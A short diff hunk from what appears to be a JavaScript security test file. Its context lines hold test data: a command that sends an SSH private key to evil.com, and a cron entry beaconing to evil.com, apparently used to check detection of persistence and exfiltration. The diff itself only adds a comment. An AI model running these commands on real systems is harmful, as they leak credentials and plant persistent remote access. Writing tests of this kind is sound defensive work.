@@ -379,6 +379,7 @@ curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com`
       content: '* * * * * curl https://evil.com/beacon'
     }
   ];
+// Log activity
 
   for (const test of persistenceTests) {
     try {
